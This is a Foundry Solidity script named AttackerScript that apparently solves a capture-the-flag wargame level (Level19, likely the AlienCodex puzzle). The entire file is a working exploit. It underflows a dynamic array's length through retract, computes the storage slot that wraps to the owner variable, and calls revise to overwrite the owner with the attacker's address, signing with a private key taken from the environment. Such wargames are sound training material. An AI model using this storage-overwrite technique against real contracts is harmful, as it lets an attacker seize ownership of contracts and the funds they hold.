// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Level19.sol";

contract AttackerScript is Script {
    Level19 level19 = Level19(payable(0x972a93153aeFa4fBc51d3b977F347f646B9a6C6d));

    function run() public {
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
      //Contact the contract
      level19.make_contact();

      //Underflow the length of codex
      level19.retract();

      // Slot of the codex length
      bytes32 codex_index = keccak256((abi.encodePacked(uint256(1))));

      //Slot of the owner address
      uint256 owner_index = 2 ** 256 - 1 - uint(codex_index) + 1;

      //Overflow the owner address by targeting it's address with our address
      level19.revise(owner_index, bytes32(uint256(uint160(address(0x6bB635a27447c6bDDE8935557fe73E34AaF76Eea))))); //Transform address into bytes32
      vm.stopBroadcast();
    }
}
